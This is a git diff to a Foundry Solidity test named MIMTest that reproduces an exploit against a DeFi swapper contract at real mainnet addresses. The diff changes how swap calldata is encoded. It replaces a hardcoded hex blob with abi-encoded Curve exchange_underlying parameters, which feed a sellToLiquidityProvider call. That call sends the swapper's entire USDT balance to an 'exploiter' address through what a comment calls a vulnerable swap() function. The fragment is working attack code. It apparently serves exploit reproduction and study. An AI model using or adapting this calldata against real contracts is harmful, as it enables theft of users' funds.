@@ -35,6 +35,19 @@ interface ISwapper {
 }
 
 contract MIMTest is Test {
+
+    struct CurveData {
+        address curveAddress;
+        bytes4 exchangeFunctionSelector;
+        int128 fromCoinIdx;
+        int128 toCoinIdx;
+    }
+    
+    address CurveAddress = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B;
+    bytes4 CurveFunctionSelector = bytes4(keccak256(bytes("exchange_underlying(int128,int128,uint256,uint256)")));
+    int128 FromCoinIdx = 3;
+    int128 ToCoinIdx = 0;
+
     // Stargate Tether USD Token
     IERC20 SUSDT = IERC20(0x38EA452219524Bb87e18dE1C24D3bB59510BD783);
     // Magic Internet Money Token
@@ -83,8 +96,9 @@ contract MIMTest is Test {
         );
 
         // Creating swapData which will be used for calling proxy contract inside vulnerable swap() function.
-        bytes
-            memory auxiliaryData = hex"0000000000000000000000005a6a4d54456819380173272a5e8e9b9904bdf41ba6417ed60000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000";
+        // bytes
+        //     memory auxiliaryData = hex"0000000000000000000000005a6a4d54456819380173272a5e8e9b9904bdf41ba6417ed60000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000";
+        bytes memory auxiliaryDatas = abi.encode(CurveAddress, CurveFunctionSelector, FromCoinIdx, ToCoinIdx);
         bytes memory data = abi.encodeWithSignature(
             "sellToLiquidityProvider(address,address,address,address,uint256,uint256,bytes)",
             address(USDT), // inputToken
@@ -93,7 +107,7 @@ contract MIMTest is Test {
             exploiter, // recipient
             USDT.balanceOf(address(ZeroXStargateLPSwapper)), // sellAmount
             16_716_883_658_670_000_000_000, // minBuyAmount
-            auxiliaryData // auxiliaryData
+            auxiliaryDatas // auxiliaryData
         );
 
         // By making call to zeroXEchangeProxy.call(swapData) inside swap function,
